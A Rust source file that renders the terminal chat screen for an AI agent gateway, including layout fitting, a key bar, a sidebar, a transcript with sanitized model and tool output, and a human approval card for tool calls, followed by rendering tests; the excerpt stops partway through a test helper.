//! Drawing the chat screen from [`App`]. Every piece of text that came
//! from the model, a tool or the gateway is passed through
//! [`sanitize`] here, at the last step before a cell.

use std::time::Instant;

use ratatui::Frame;
use ratatui::layout::{Constraint, Layout, Position, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, Paragraph};

use super::app::{App, Entry};
use super::panels::{SideItem, panels};
use super::text::{layout_input, sanitize, width, wrap};

/// Rows of anything else a card shows per field.
const CARD_FIELD_ROWS: usize = 3;
/// Rows of a tool's output the transcript shows before it says the
/// rest is cut.
const TOOL_OUTPUT_ROWS: usize = 6;
/// Rows of draft the input box grows to.
const INPUT_ROWS: usize = 6;
/// Columns the sidebar and the panels take beside the transcript, and
/// the least the transcript keeps.
const SIDEBAR_COLS: u16 = 30;
const PANELS_COLS: u16 = 36;
const TRANSCRIPT_MIN_COLS: u16 = 54;
/// Below the full layout's width the panels narrow to one column of this
/// width rather than disappear, and the transcript keeps at least the
/// narrow minimum beside them.
const PANELS_NARROW_COLS: u16 = 24;
const TRANSCRIPT_NARROW_MIN_COLS: u16 = 40;

/// What fits beside the transcript at `width`: the sidebar's and the
/// panels' columns, and a note for the status line when something
/// toggled on is not drawn.
///
/// Both flags start on, so on a screen too narrow for the panels a
/// toggle used to change nothing anyone could see. Now the panels are
/// drawn whenever they fit at all, taking the sidebar's place when the
/// two do not fit together, and when even that is too wide the status
/// line says how many columns they need.
fn fit(width: u16, show_sidebar: bool, show_panels: bool) -> (u16, u16, Option<String>) {
    let panels_need = PANELS_NARROW_COLS + TRANSCRIPT_NARROW_MIN_COLS;
    let both_need = SIDEBAR_COLS + PANELS_COLS + TRANSCRIPT_MIN_COLS;
    let panel_cols = if !show_panels {
        0
    } else if width >= PANELS_COLS + TRANSCRIPT_MIN_COLS {
        PANELS_COLS
    } else if width >= panels_need {
        PANELS_NARROW_COLS
    } else {
        0
    };
    let side_cols = if show_sidebar
        && width >= SIDEBAR_COLS + TRANSCRIPT_MIN_COLS
        && (panel_cols == 0 || width >= both_need)
    {
        SIDEBAR_COLS
    } else {
        0
    };
    // Short, because the status line is as wide as the transcript.
    let note = if show_panels && panel_cols == 0 {
        Some(format!(
            "panels hidden: need {panels_need} columns, {width} now"
        ))
    } else if show_sidebar && side_cols == 0 && panel_cols > 0 {
        Some(format!(
            "sidebar hidden: both need {both_need} columns, {width} now"
        ))
    } else {
        None
    };
    (side_cols, panel_cols, note)
}

/// Why Ctrl+F cannot open the search at `width`, or `None` when the
/// sidebar it lives in can be drawn. Width 0 is a screen not drawn yet.
pub(crate) fn search_refusal(width: u16, show_panels: bool) -> Option<String> {
    if width == 0 || fit(width, true, show_panels).0 > 0 {
        return None;
    }
    let need = if fit(width, false, show_panels).1 > 0 {
        SIDEBAR_COLS + PANELS_COLS + TRANSCRIPT_MIN_COLS
    } else {
        SIDEBAR_COLS + TRANSCRIPT_MIN_COLS
    };
    Some(format!(
        "search needs the sidebar: {need} columns, {width} now"
    ))
}

/// The chat's colors, by the role each plays on screen. Every cell is
/// drawn on [`palette::BG`]; the key bar on [`palette::BAR`].
// The roles the redesign has not drawn yet are unused until it does.
#[allow(dead_code)]
pub(crate) mod palette {
    use ratatui::style::{Color, Style};

    pub const BG: Color = Color::Rgb(0x0f, 0x11, 0x15);
    pub const BAR: Color = Color::Rgb(0x1c, 0x21, 0x28);
    /// Text: what was said, and what a key does.
    pub const TEXT: Color = Color::Rgb(0xc9, 0xd1, 0xd9);
    /// Frame lines, rules and separators.
    pub const RULE: Color = Color::Rgb(0x6e, 0x76, 0x81);
    /// What the operator wrote or must read before answering.
    pub const WHITE: Color = Color::Rgb(0xff, 0xff, 0xff);
    /// What waits on the operator: a card, its tier.
    pub const AMBER: Color = Color::Rgb(0xf0, 0xb4, 0x29);
    /// Facts about the session: model, counts, labels.
    pub const GRAY: Color = Color::Rgb(0x8b, 0x94, 0x9e);
    /// Keys.
    pub const BLUE: Color = Color::Rgb(0x79, 0xc0, 0xff);
    /// The agent, and what the agent says.
    pub const CYAN: Color = Color::Rgb(0x56, 0xd4, 0xdd);
    /// Placeholders and what does not apply now.
    pub const DIM: Color = Color::Rgb(0x7d, 0x85, 0x90);
    /// A failure or a refusal.
    pub const RED: Color = Color::Rgb(0xff, 0xa1, 0x98);

    pub fn on_bg(fg: Color) -> Style {
        Style::default().fg(fg).bg(BG)
    }

    pub fn on_bar(fg: Color) -> Style {
        Style::default().fg(fg).bg(BAR)
    }
}

/// The key the bar keeps whatever its width: the keys screen.
pub(crate) const PINNED: (&str, &str) = ("Ctrl+G", "keys");
/// Cells kept clear between the last hint and the pinned key.
const BAR_GAP: usize = 2;

/// The key bar's hints, by state, most needed first. The bar drops them
/// from the right as the window narrows.
const HINTS: &[(&str, &str)] = &[
    ("Enter", "send"),
    ("Ctrl+J", "new line"),
    ("PgUp/PgDn", "scroll"),
    ("/", "commands"),
    ("Ctrl+F", "search"),
    ("Ctrl+N", "new"),
    ("Ctrl+C", "quit"),
];
/// Scrolled up, the way back leads.
const HINTS_SCROLLED: &[(&str, &str)] = &[
    ("End", "latest"),
    ("PgUp/PgDn", "scroll"),
    ("Enter", "send"),
    ("Ctrl+J", "new line"),
    ("/", "commands"),
    ("Ctrl+F", "search"),
];
/// At a card the answer rule is on the card; the bar has the rest.
const HINTS_CARD: &[(&str, &str)] = &[
    ("PgUp/PgDn", "scroll"),
    ("Ctrl+U", "clear answer"),
    ("Ctrl+K", "verify chain"),
];
const HINTS_EXPIRED: &[(&str, &str)] = &[("Enter", "dismiss"), ("PgUp/PgDn", "scroll")];
const HINTS_SEARCH: &[(&str, &str)] = &[
    ("type", "to filter"),
    ("↑↓", "select"),
    ("Enter", "open"),
    ("Esc", "close"),
];

/// The bottom row at `width`: as many of `hints` as fit, left to right,
/// and `pinned` at the right, which never drops. `note`, when there is
/// one, says why a key just did nothing, in place of the hints.
pub(crate) fn key_bar(
    width: usize,
    hints: &[(&str, &str)],
    pinned: (&str, &str),
    note: Option<&str>,
) -> Line<'static> {
    use palette::{BAR, BG, BLUE, GRAY, RULE, on_bar};
    let pinned_width = width_of(pinned.0) + 1 + width_of(pinned.1);
    let room = width.saturating_sub(1 + pinned_width + 1);
    let mut spans = vec![Span::styled(" ", on_bar(GRAY))];
    let mut used = 0;
    if let Some(note) = note {
        let note: String = note.chars().take(room.saturating_sub(BAR_GAP)).collect();
        used = width_of(&note);
        spans.push(Span::styled(note, on_bar(GRAY)));
    } else {
        for (i, (key, what)) in hints.iter().enumerate() {
            let sep = if i == 0 { 0 } else { 3 };
            let w = sep + width_of(key) + 1 + width_of(what);
            if used + w + BAR_GAP > room {
                break;
            }
            if sep > 0 {
                spans.push(Span::styled(" ", on_bar(GRAY)));
                spans.push(Span::styled("·", on_bar(RULE)));
                spans.push(Span::styled(" ", on_bar(GRAY)));
            }
            spans.push(Span::styled(key.to_string(), on_bar(BLUE)));
            spans.push(Span::styled(" ", on_bar(GRAY)));
            spans.push(Span::styled(what.to_string(), on_bar(GRAY)));
            used += w;
        }
    }
    let pad = room.saturating_sub(used);
    spans.push(Span::styled(" ".repeat(pad), on_bar(GRAY)));
    let pin = Style::default().fg(BG).bg(BLUE);
    spans.push(Span::styled(pinned.0.to_string(), pin));
    spans.push(Span::styled(" ", pin));
    spans.push(Span::styled(pinned.1.to_string(), pin));
    spans.push(Span::styled(" ", Style::default().bg(BAR)));
    Line::from(spans)
}

fn width_of(s: &str) -> usize {
    width(s)
}

/// The hints for what the screen is showing now. `scrolled` is whether
/// the transcript, as drawn, has rows below the view.
fn hints_for(app: &App, scrolled: bool) -> &'static [(&'static str, &'static str)] {
    if app.expired.is_some() {
        HINTS_EXPIRED
    } else if app.front_card().is_some() {
        HINTS_CARD
    } else if app.searching {
        HINTS_SEARCH
    } else if scrolled {
        HINTS_SCROLLED
    } else {
        HINTS
    }
}

/// How the model's own words are drawn on the card: set apart from what
/// the gateway established, because they are a claim, not a fact.
pub(crate) fn claim_style() -> Style {
    Style::default()
        .fg(Color::Magenta)
        .add_modifier(Modifier::ITALIC)
}

/// The style of both answers on the card. One style for both: neither
/// is the default, and approving is not drawn as the expected choice.
pub(crate) fn choice_style() -> Style {
    Style::default().add_modifier(Modifier::BOLD)
}

pub(crate) fn draw(frame: &mut Frame<'_>, app: &App, now: Instant) {
    let screen = frame.area();
    frame.render_widget(
        Block::default().style(palette::on_bg(palette::TEXT)),
        screen,
    );
    // The bottom row is the key bar, across the whole width, whatever
    // else is drawn.
    let [full, bar_area] =
        Layout::vertical([Constraint::Min(0), Constraint::Length(1)]).areas(screen);
    let (side_cols, panel_cols, _) = fit(full.width, app.show_sidebar, app.show_panels);
    let [side_area, area, panel_area] = Layout::horizontal([
        Constraint::Length(side_cols),
        Constraint::Min(TRANSCRIPT_NARROW_MIN_COLS),
        Constraint::Length(panel_cols),
    ])
    .areas(full);
    if side_cols > 0 {
        draw_sidebar(frame, app, side_area);
    }
    if panel_cols > 0 {
        draw_panels(frame, app, panel_area);
    }

    let inner_width = usize::from(area.width.saturating_sub(2)).max(1);

    let (card, arguments_cut) = card_lines(app, inner_width, now);
    let card_height = if card.is_empty() {
        0
    } else {
        u16::try_from(card.len() + 2).unwrap_or(u16::MAX)
    };

    let (input_text, input_cursor) = if app.front_card().is_some() {
        (app.answer.clone(), app.answer.len())
    } else {
        (app.draft.clone(), app.cursor)
    };
    let (input_rows, (cursor_row, cursor_col)) =
        layout_input(&input_text, input_cursor, inner_width);
    let shown_rows = input_rows.len().min(INPUT_ROWS);
    let first_row = (cursor_row + 1).saturating_sub(shown_rows);
    let input_height = u16::try_from(shown_rows + 2).unwrap_or(u16::MAX);

    let input_title = if app.expired.is_some() {
        " Enter or Esc to dismiss "
    } else if app.front_card().is_some() {
        " your answer: y approves, anything else refuses "
    } else if app.busy {
        " waiting for the reply "
    } else {
        " message "
    };
    let rows: Vec<String> = input_rows
        .iter()
        .skip(first_row)
        .take(shown_rows)
        .cloned()
        .collect();

    let (scrolled, input_area) = if card_height == 0 {
        // No card: the transcript and the draft are one box, the rule
        // between them saying where the view is.
        let below = draw_conversation(frame, app, area, input_title.trim(), &rows);
        let input_area = Rect::new(
            area.x,
            area.bottom().saturating_sub(input_height),
            area.width,
            input_height,
        );
        (below > 0, input_area)
    } else {
        let [transcript_area, card_area, input_area] = Layout::vertical([
            Constraint::Min(3),
            Constraint::Length(card_height),
            Constraint::Length(input_height),
        ])
        .areas(area);

        // The card takes an approval only when all of it is on the screen:
        // every row of the arguments, every line at its full width, and its
        // last line.
        let too_wide = card.iter().any(|line| line.width() > inner_width);
        app.card_cut.set(
            app.front_card().is_some()
                && (arguments_cut || too_wide || card_area.height < card_height),
        );

        let scrolled = draw_transcript(frame, app, transcript_area) > 0;
        let title = if app.expired.is_some() {
            " approval expired "
        } else {
            " approval needed "
        };
        frame.render_widget(
            Paragraph::new(card).block(
                Block::default()
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Yellow))
                    .title(title),
            ),
            card_area,
        );
        frame.render_widget(
            Paragraph::new(rows.into_iter().map(Line::raw).collect::<Vec<_>>())
                .block(Block::default().borders(Borders::ALL).title(input_title)),
            input_area,
        );
        (scrolled, input_area)
    };
    if card_height == 0 {
        app.card_cut.set(false);
    }
    if app.searching && side_cols > 0 {
        let x = side_area.x + 1 + u16::try_from(width(&app.search)).unwrap_or(0);
        frame.set_cursor_position(Position::new(
            x.min(side_area.right().saturating_sub(2)),
            side_area.y + 1,
        ));
    } else if app.expired.is_none() {
        let x = input_area.x + 1 + u16::try_from(cursor_col).unwrap_or(0);
        let y = input_area.y + 1 + u16::try_from(cursor_row - first_row).unwrap_or(0);
        frame.set_cursor_position(Position::new(
            x.min(input_area.right().saturating_sub(2)),
            y,
        ));
    }

    frame.render_widget(
        Paragraph::new(key_bar(
            usize::from(bar_area.width),
            hints_for(app, scrolled),
            PINNED,
            app.notice.as_deref(),
        )),
        bar_area,
    );
}

fn draw_sidebar(frame: &mut Frame<'_>, app: &App, area: Rect) {
    let cols = usize::from(area.width.saturating_sub(2)).max(1);
    let fit = |s: &str, cols: usize| -> String {
        let rows = wrap(&sanitize(s), cols.max(1));
        let first = rows.first().cloned().unwrap_or_default();
        if rows.len() > 1 {
            format!("{first}...")
        } else {
            first
        }
    };
    let dim = Style::default().fg(Color::DarkGray);
    let mut lines = vec![
        Line::styled(
            if app.search.is_empty() && !app.searching {
                "search: Ctrl+F".to_string()
            } else {
                format!("search: {}", sanitize(&app.search))
            },
            if app.searching { Style::default() } else { dim },
        ),
        Line::raw(""),
    ];
    let dir = &app.directory;
    for (i, item) in app.side_items().iter().enumerate() {
        let selected = app.searching && i == app.selected.min(app.side_items().len() - 1);
        let mut line = match item {
            SideItem::NewChat => {
                Line::from(vec![Span::raw("+ new chat"), Span::styled("  Ctrl+N", dim)])
            }
            SideItem::Agent(a) => {
                let agent = &dir.agents[*a];
                let current = agent.id == app.agent;
                Line::from(vec![
                    Span::styled(
                        format!(
                            "{}{} ",
                            if current { "* " } else { "  " },
                            fit(&agent.id, 12)
                        ),
                        Style::default().add_modifier(Modifier::BOLD),
                    ),
                    Span::styled(
                        fit(
                            &format!("{}/{}", agent.provider, agent.model),
                            cols.saturating_sub(16),
                        ),
                        dim,
                    ),
                ])
            }
            SideItem::Conversation(c) => {
                let conv = &dir.conversations[*c];
                let title = conv.title.as_deref().unwrap_or("(no message yet)");
                let current = conv.conversation == app.conversation && conv.agent == app.agent;
                let time = conv.updated.get(11..16).unwrap_or("");
                Line::from(vec![
                    Span::raw(format!("    {}", fit(title, cols.saturating_sub(11)))),
                    Span::styled(format!(" {time}"), dim),
                ])
                .style(if current {
                    Style::default().add_modifier(Modifier::UNDERLINED)
                } else {
                    Style::default()
                })
            }
        };
        if selected {
            line = line.style(Style::default().add_modifier(Modifier::REVERSED));
        }
        lines.push(line);
    }
    frame.render_widget(
        Paragraph::new(lines).block(Block::default().borders(Borders::ALL).title(" agents ")),
        area,
    );
}

fn draw_panels(frame: &mut Frame<'_>, app: &App, area: Rect) {
    let Some(status) = &app.status else {
        frame.render_widget(
            Paragraph::new("asking the gateway...")
                .block(Block::default().borders(Borders::ALL).title(" status ")),
            area,
        );
        return;
    };
    let cols = usize::from(area.width.saturating_sub(2)).max(1);
    let shown = panels(status, app.verified.as_ref());
    let blocks: Vec<(String, Vec<Line<'static>>)> = shown
        .into_iter()
        .map(|p| {
            let mut lines = Vec::new();
            for l in p.lines {
                for (i, row) in wrap(&sanitize(&l), cols).into_iter().enumerate() {
                    // Two rows a line at most: the panels are a summary.
                    if i < 2 {
                        lines.push(Line::raw(row));
                    }
                }
            }
            (format!(" {} ", p.title), lines)
        })
        .collect();
    let constraints: Vec<Constraint> = blocks
        .iter()
        .map(|(_, l)| Constraint::Length(u16::try_from(l.len() + 2).unwrap_or(u16::MAX)))
        .chain(std::iter::once(Constraint::Min(0)))
        .collect();
    let areas = Layout::vertical(constraints).split(area);
    for ((title, lines), rect) in blocks.into_iter().zip(areas.iter()) {
        frame.render_widget(
            Paragraph::new(lines).block(Block::default().borders(Borders::ALL).title(title)),
            *rect,
        );
    }
}

/// The transcript's rows at `width` cells, oldest first.
fn transcript_lines(app: &App, width: usize) -> Vec<Line<'static>> {
    let mut lines: Vec<Line<'static>> = Vec::new();
    let label = Style::default().add_modifier(Modifier::BOLD);
    for entry in &app.entries {
        match entry {
            Entry::User(text) => {
                lines.push(Line::styled("you", label.fg(Color::Cyan)));
                indented(&mut lines, text, width, Style::default());
            }
            Entry::Agent(text) => {
                lines.push(Line::styled(sanitize(&app.agent), label.fg(Color::Green)));
                for row in super::markdown::lines(&sanitize(text), width.saturating_sub(2)) {
                    let mut spans = vec![Span::raw("  ")];
                    spans.extend(row.spans);
                    lines.push(Line::from(spans));
                }
            }
            Entry::Tool {
                name,
                arguments,
                outcome,
                output,
                ..
            } => {
                let state = match outcome {
                    None => "running",
                    Some(true) => "done",
                    Some(false) => "failed",
                };
                let call = format!(
                    "{} {}",
                    sanitize(name),
                    sanitize(arguments).replace('\n', " ")
                );
                let rows = wrap(&call, width.saturating_sub(16));
                let mut shown = rows.first().cloned().unwrap_or_default();
                if rows.len() > 1 {
                    shown.push_str("...");
                }
                lines.push(Line::from(vec![
                    Span::styled("  tool ", Style::default().fg(Color::Magenta)),
                    Span::raw(shown),
                    Span::styled(format!(" {state}"), Style::default().fg(Color::DarkGray)),
                ]));
                // What the tool returned, under its line, however the
                // model's reply then went.
                let returned = sanitize(output);
                let body = wrap(returned.trim_end(), width.saturating_sub(4));
                let cut = body.len() > TOOL_OUTPUT_ROWS;
                for row in body.into_iter().take(TOOL_OUTPUT_ROWS) {
                    lines.push(Line::raw(format!("    {row}")));
                }
                if cut {
                    lines.push(Line::styled(
                        "    ... (cut)",
                        Style::default().fg(Color::DarkGray),
                    ));
                }
            }
            Entry::Note(text) => {
                for row in wrap(&sanitize(text), width.saturating_sub(2)) {
                    lines.push(Line::styled(
                        format!("  {row}"),
                        Style::default().fg(Color::Yellow),
                    ));
                }
            }
            Entry::Help => lines.extend(help_lines(width)),
        }
        lines.push(Line::raw(""));
    }
    lines
}

/// Which of `total` rows a view of `height` shows, scrolled `scroll` up
/// from the latest: `[start, end)`, with `start` rows above it and
/// `total - end` below.
fn view_window(total: usize, height: usize, scroll: usize) -> (usize, usize) {
    let below = scroll.min(total.saturating_sub(height));
    let end = total - below;
    (end.saturating_sub(height), end)
}

/// The transcript box's title: the chat and the agent.
fn transcript_title(app: &App) -> Line<'static> {
    use palette::{CYAN, RULE, TEXT, on_bg};
    Line::from(vec![
        Span::styled(" wirken chat ", on_bg(TEXT)),
        Span::styled("·", on_bg(RULE)),
        Span::styled(" ", on_bg(TEXT)),
        Span::styled(sanitize(&app.agent), on_bg(CYAN)),
        Span::styled(" ", on_bg(TEXT)),
    ])
}

/// Draw the transcript into `area`, and return how many rows are below
/// the view: the scroll as drawn, not as asked for.
fn draw_transcript(frame: &mut Frame<'_>, app: &App, area: Rect) -> usize {
    let width = usize::from(area.width.saturating_sub(2)).max(1);
    let lines = transcript_lines(app, width);
    let height = usize::from(area.height.saturating_sub(2));
    let (start, end) = view_window(lines.len(), height, app.scroll);
    let block = Block::default()
        .borders(Borders::ALL)
        .border_style(palette::on_bg(palette::RULE))
        .title(transcript_title(app));
    frame.render_widget(
        Paragraph::new(lines[start..end].to_vec()).block(block),
        area,
    );
    lines.len() - end
}

/// The rows of a scroll thumb on a track of `track` rows, for a view of
/// `track` rows `above` rows into `total`: `[start, end)`. Empty when all
/// of it is in view.
fn thumb(track: usize, total: usize, above: usize) -> (usize, usize) {
    if total <= track || track == 0 {
        return (0, 0);
    }
    let round = |n: usize| (n + total / 2) / total;
    let size = round(track * track).clamp(1, track);
    let start = round(above * track).min(track - size);
    (start, start + size)
}

/// The transcript and the draft in one box: the conversation above, the
/// rule naming the draft, then the draft's `input` rows. Once the
/// conversation is taller than its rows, a thumb in the right border
/// and the rule's right end say where the view is: rows above, rows
/// below, and the key back to the latest. Returns the rows below.
fn draw_conversation(
    frame: &mut Frame<'_>,
    app: &App,
    area: Rect,
    input_title: &str,
    input: &[String],
) -> usize {
    use palette::{BLUE, GRAY, RULE, TEXT, on_bg};
    let width = usize::from(area.width.saturating_sub(2)).max(1);
    let input_rows = u16::try_from(input.len().max(1)).unwrap_or(1);
    let content_rows = area.height.saturating_sub(3 + input_rows);
    let lines = transcript_lines(app, width);
    let height = usize::from(content_rows);
    let (start, end) = view_window(lines.len(), height, app.scroll);
    let (above, below) = (start, lines.len() - end);

    frame.render_widget(
        Block::default()
            .borders(Borders::ALL)
            .border_style(on_bg(RULE))
            .title(transcript_title(app)),
        area,
    );
    let content = Rect::new(
        area.x + 1,
        area.y + 1,
        area.width.saturating_sub(2),
        content_rows,
    );
    frame.render_widget(Paragraph::new(lines[start..end].to_vec()), content);

    // The thumb, in the right border beside the rows it stands for.
    let (t0, t1) = thumb(height, lines.len(), above);
    let right = area.right().saturating_sub(1);
    for row in t0..t1 {
        let y = content.y + u16::try_from(row).unwrap_or(0);
        if let Some(cell) = frame.buffer_mut().cell_mut((right, y)) {
            cell.set_symbol("█").set_style(on_bg(GRAY));
        }
    }

    // The rule between the conversation and the draft.
    let rule_y = content.y + content_rows;
    let mut position: Vec<Span<'static>> = Vec::new();
    if lines.len() > height {
        position.push(Span::styled(format!("↑ {above} above"), on_bg(GRAY)));
        if below > 0 {
            position.push(Span::styled(" · ", on_bg(RULE)));
            position.push(Span::styled(format!("↓ {below} below"), on_bg(TEXT)));
            position.push(Span::styled(" · ", on_bg(RULE)));
            position.push(Span::styled("End", on_bg(BLUE)));
            position.push(Span::styled(" latest", on_bg(GRAY)));
        }
    }
    let total = usize::from(area.width);
    let title = format!(" {input_title} ");
    let used = 1 + width_of(&title) + 1;
    let position_width: usize = position.iter().map(|s| width_of(&s.content)).sum();
    let mut rule = vec![
        Span::styled("├", on_bg(RULE)),
        Span::styled(title, on_bg(GRAY)),
    ];
    let fill = if position_width > 0 {
        total.saturating_sub(used + position_width + 2)
    } else {
        total.saturating_sub(used)
    };
    rule.push(Span::styled("─".repeat(fill), on_bg(RULE)));
    if position_width > 0 {
        rule.push(Span::styled(" ", on_bg(RULE)));
        rule.extend(position);
        rule.push(Span::styled(" ", on_bg(RULE)));
    }
    rule.push(Span::styled("┤", on_bg(RULE)));
    frame.render_widget(
        Paragraph::new(Line::from(rule)),
        Rect::new(area.x, rule_y, area.width, 1),
    );

    let draft = Rect::new(
        area.x + 1,
        rule_y + 1,
        area.width.saturating_sub(2),
        input_rows,
    );
    frame.render_widget(
        Paragraph::new(input.iter().cloned().map(Line::raw).collect::<Vec<_>>()),
        draft,
    );
    below
}

/// Rows between the longest name in a `/help` table and its
/// description.
const HELP_GAP: usize = 2;
/// Where a `/help` table's names start, under its heading.
const HELP_INDENT: usize = 4;

/// The column a `/help` table's descriptions start at: past its longest
/// name and the gap.
fn help_column(rows: &[(&str, &str)]) -> usize {
    HELP_INDENT
        + rows
            .iter()
            .map(|(name, _)| name.chars().count())
            .max()
            .unwrap_or(0)
        + HELP_GAP
}

/// `/help` at `width`: the commands, then the keys, each a table whose
/// descriptions wrap inside their own column, so a continued line stays
/// under the description it continues.
fn help_lines(width: usize) -> Vec<Line<'static>> {
    let style = Style::default().fg(Color::Yellow);
    let mut lines = Vec::new();
    for (title, rows) in [
        ("commands", super::slash::COMMANDS),
        ("keys", super::app::KEYS),
    ] {
        lines.push(Line::styled(
            format!("  {title}"),
            style.add_modifier(Modifier::BOLD),
        ));
        let column = help_column(rows);
        let room = width.saturating_sub(column).max(10);
        for (name, what) in rows {
            for (i, row) in wrap(what, room).into_iter().enumerate() {
                let lead = if i == 0 {
                    format!(
                        "{:indent$}{name:<pad$}",
                        "",
                        indent = HELP_INDENT,
                        pad = column - HELP_INDENT
                    )
                } else {
                    " ".repeat(column)
                };
                lines.push(Line::styled(format!("{lead}{row}"), style));
            }
        }
    }
    lines
}

fn indented(lines: &mut Vec<Line<'static>>, text: &str, width: usize, style: Style) {
    for row in wrap(&sanitize(text), width.saturating_sub(2)) {
        lines.push(Line::styled(format!("  {row}"), style));
    }
}

/// The card in front as lines of at most `width` cells, or the expired
/// one, or nothing; and whether its arguments were cut.
fn card_lines(app: &App, width: usize, now: Instant) -> (Vec<Line<'static>>, bool) {
    let mut lines = Vec::new();
    let mut arguments_cut = false;
    if let Some(ask) = &app.expired {
        let said = format!(
            "The request to run {} expired; the gateway records it as refused.",
            sanitize(&ask.tool_name)
        );
        lines.extend(wrap(&said, width).into_iter().map(Line::raw));
        return (lines, false);
    }
    let Some(card) = app.front_card() else {
        return (lines, false);
    };
    let ask = &card.ask;
    let mut field = |name: &str, value: &str, rows: usize, style: Option<Style>| {
        let value = sanitize(value);
        if value.trim().is_empty() {
            return false;
        }
        let prefix = format!("{name}: ");
        let body = wrap(&value, width.saturating_sub(prefix.chars().count()).max(10));
        let cut = body.len() > rows;
        let label = style.unwrap_or_else(|| Style::default().fg(Color::DarkGray));
        let text = style.unwrap_or_default();
        for (i, row) in body.into_iter().take(rows).enumerate() {
            let lead = if i == 0 {
                prefix.clone()
            } else {
                " ".repeat(prefix.chars().count())
            };
            lines.push(Line::from(vec![
                Span::styled(lead, label),
                Span::styled(row, text),
            ]));
        }
        if cut {
            lines.push(Line::styled(
                "  ... (cut)",
                Style::default().fg(Color::DarkGray),
            ));
        }
        cut
    };
    // The card every surface renders, line by line. What the gateway
    // established is drawn plain; the model's own account of the call
    // is set apart, since the gateway has not checked it and it is not
    // a description of what will run. The arguments, which are, get
    // every row they need: the gateway sends none longer than a card
    // line holds, and a card that does not fit the screen takes no
    // approval.
    for line in ask.card().lines() {
        let is_arguments = line.label == "arguments";
        let rows = if is_arguments {
            usize::MAX
        } else {
            CARD_FIELD_ROWS
        };
        let cut = field(
            line.label,
            &line.value,
            rows,
            line.is_model_claim.then(claim_style),
        );
        arguments_cut |= is_arguments && cut;
    }

    // The two answers, drawn alike; on a card too narrow for one line,
    // what Enter alone does goes on the next.
    let choices = vec![
        Span::styled("[y] approve", choice_style()),
        Span::raw("   "),
        Span::styled("[n] refuse", choice_style()),
    ];
    let enter = "Enter alone refuses.";
    let one_line = Line::from(choices.clone()).width() + 3 + enter.chars().count();
    if one_line <= width {
        let mut row = choices;
        row.push(Span::styled(
            format!("   {enter}"),
            Style::default().fg(Color::DarkGray),
        ));
        lines.push(Line::from(row));
    } else {
        lines.push(Line::from(choices));
        lines.push(Line::styled(enter, Style::default().fg(Color::DarkGray)));
    }

    let waiting = app.cards.len().saturating_sub(1);
    let mut status = match card.armed_at {
        Some(at) if now < at => "Read the request; it takes an answer in a moment.".to_string(),
        _ => "Type y and Enter to approve; n, a reason, or anything else refuses.".to_string(),
    };
    if let Some(at) = card.expires_at {
        status.push_str(&format!(
            " Closes in {}s.",
            at.saturating_duration_since(now).as_secs()
        ));
    }
    if waiting > 0 {
        status.push_str(&format!(" {waiting} more waiting."));
    }
    // Wrapped, not cut: the last line is how the card is answered, and
    // it is read whole or the card takes no answer.
    for row in wrap(&status, width) {
        lines.push(Line::styled(row, Style::default().fg(Color::Yellow)));
    }
    (lines, arguments_cut)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::commands::chat::wire::{ApprovalAsk, ServerEvent};
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;

    fn screen(app: &App, now: Instant) -> String {
        let mut terminal = Terminal::new(TestBackend::new(60, 30)).unwrap();
        terminal.draw(|f| draw(f, app, now)).unwrap();
        let buffer = terminal.backend().buffer().clone();
        let mut out = String::new();
        for y in 0..buffer.area.height {
            for x in 0..buffer.area.width {
                out.push_str(buffer[(x, y)].symbol());
            }
            out.push('\n');
        }
        out
    }

    fn row_text(buffer: &ratatui::buffer::Buffer, y: u16) -> String {
        (0..buffer.area.width)
            .map(|x| buffer[(x, y)].symbol().to_string())
            .collect()
    }

    fn all_text(buffer: &ratatui::buffer::Buffer) -> String {
        (0..buffer.area.height)
            .map(|y| row_text(buffer, y))
            .collect::<Vec<_>>()
            .join("\n")
    }

    fn pipeline_card(app: &mut App, now: Instant) {
        app.on_server(
            ServerEvent::Approval(ApprovalAsk {
                request_id: "r1".into(),
                tool_name: "exec".into(),
                action_key: "shell::pipeline:".into(),
                tier: "tier3".into(),
                agent: "default".into(),
                trigger: "Use the exec tool to run this command: ls | wc -l".into(),
                exec_location: "runs in sandbox container (exec_only, read-only root, workspace at /workspace, no network)".into(),
                arguments: r#"{"command":"ls | wc -l"}"#.into(),
                assistant_text: String::new(),
                timeout_secs: 300,
                exec_runtime: "docker".into(),
            }),
            now,
        );
    }

    /// The card's last line, how it is answered, is wrapped and read
    /// whole at each size, and the card takes an answer there. It used to
    /// be one line cut at the card's edge, mid-word at 120 columns.
    #[test]
    fn the_card_says_how_to_answer_it_in_full_at_each_size() {
        let now = Instant::now();
        let later = now + std::time::Duration::from_secs(2);
        // 64 columns is the narrowest layout with the panels: a card of 38.
        for (w, h) in [(80u16, 24u16), (120, 24), (120, 40), (64, 30)] {
            let mut app = App::new(Some("default".into()), "c-1".into());
            pipeline_card(&mut app, now);
            let buffer = drawn(&app, later, w, h);
            let words = all_text(&buffer)
                .replace(['│', '└', '┘', '─', '┌', '┐'], " ")
                .split_whitespace()
                .collect::<Vec<_>>()
                .join(" ");
            for whole in [
                "Type y and Enter to approve; n, a reason, or anything else refuses.",
                "Closes in",
                "[y] approve [n] refuse Enter alone refuses.",
            ] {
                assert!(
                    words.contains(whole),
                    "{w}x{h}: {whole:?} not whole:\n{}",
                    all_text(&buffer)
                );
            }
            assert!(
                !app.card_cut.get(),
                "{w}x{h}: a card shown whole takes no answer"
            );
        }
    }

    /// A card whose last line does not fit takes no approval, as a card
    /// whose arguments were cut does.
    #[test]
    fn a_card_without_room_for_its_last_line_takes_no_approval() {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let now = Instant::now();
        let later = now + std::time::Duration::from_secs(2);
        let mut app = App::new(Some("default".into()), "c-1".into());
        pipeline_card(&mut app, now);
        drawn(&app, later, 120, 14);
        assert!(app.card_cut.get(), "the card's last line is off the screen");
        app.on_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE), later);
        let sent = app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), later);
        assert!(
            !matches!(
                sent,
                Some(crate::commands::chat::app::Outgoing::Decision { approve: true, .. })
            ),
            "{sent:?}"
        );
    }

    /// The transcript's rows inside its border, as cells.
    fn transcript_rows(buffer: &ratatui::buffer::Buffer) -> Vec<Vec<String>> {
        let (title_x, top) = find(buffer, "wirken chat");
        let left = title_x - 2;
